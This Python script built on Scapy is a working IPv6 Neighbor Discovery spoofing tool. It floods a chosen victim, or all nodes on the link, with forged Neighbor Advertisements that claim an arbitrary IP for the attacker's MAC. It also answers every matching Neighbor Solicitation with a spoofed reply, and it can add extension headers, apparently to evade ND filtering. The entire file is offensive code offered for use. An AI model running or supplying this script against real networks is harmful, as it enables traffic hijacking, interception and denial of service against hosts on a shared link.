import argparse
import os
import time
import functools
import operator
import random
import ipaddress
import scapy.all as sp
import scapy.layers.inet6 as inet6

parser = argparse.ArgumentParser()
parser.add_argument('-i', '--iface')
parser.add_argument('-I', '--ip')
parser.add_argument('-M', '--mac')
parser.add_argument('-V', '--victim')
parser.add_argument('-H', '--do-hbh', action='store_true')
parser.add_argument('-F', '--do-frag', action='store_true')
parser.add_argument('-D', '--do-dst', action='store_true')
args = parser.parse_args()
iface = args.iface
ip = args.ip
mac = args.mac
victim = args.victim
do_hbh = args.do_hbh
do_frag = args.do_frag
do_dst = args.do_dst

if iface:
    sp.conf.iface = iface

ip = ip or sp.conf.iface.ips[6][-1]
mac = mac or sp.conf.iface.mac

victim_mac = ''
filterstr = ''
if victim:
    victim_mac = sp.getmacbyip6(victim)
    filterstr = f'icmp6[icmp6type]==icmp6-neighborsolicit and ether src {victim_mac}'
else:
    victim = 'ff02::1'
    victim_mac = '33:33:00:00:00:01'
    filterstr = 'icmp6[icmp6type]==icmp6-neighborsolicit'

ipexthdrs = []
if do_hbh:
    ipexthdrs.append(inet6.IPv6ExtHdrHopByHop())
if do_frag:
    ipexthdrs.append(inet6.IPv6ExtHdrFragment(id=random.getrandbits(32)))
if do_dst:
    ipexthdrs.append(inet6.IPv6ExtHdrDestOpt())
if ipexthdrs:
    ipexthdrs = functools.reduce(operator.truediv, ipexthdrs)
else:
    ipexthdrs = None

if os.fork() == 0:
    p = sp.Ether(src=mac, dst=victim_mac) / \
        inet6.IPv6(src=ip, dst=victim)
    if ipexthdrs:
        p /= ipexthdrs
    p /= inet6.ICMPv6ND_NA(R=0, S=0, O=1, tgt=ip) / \
        inet6.ICMPv6NDOptDstLLAddr(lladdr=mac)
    while True:
        time.sleep(5)
        sp.sendp(p, verbose=0)


def prn(pkt):
    ippkt = pkt[inet6.IPv6]
    nspkt = ippkt[inet6.ICMPv6ND_NS]
    if nspkt.tgt != ip:
        return
    print(f'Spoofing to solicit from {ippkt.src}')

    p = sp.Ether(src=mac, dst=pkt.src) / \
        inet6.IPv6(src=ip, dst=ippkt.src)
    if ipexthdrs:
        p /= ipexthdrs
    p /= inet6.ICMPv6ND_NA(R=0, S=1, O=1, tgt=ip) / \
        inet6.ICMPv6NDOptDstLLAddr(lladdr=mac)
    sp.sendp(p, verbose=0)


sp.sniff(filter=filterstr, prn=prn, quiet=True)
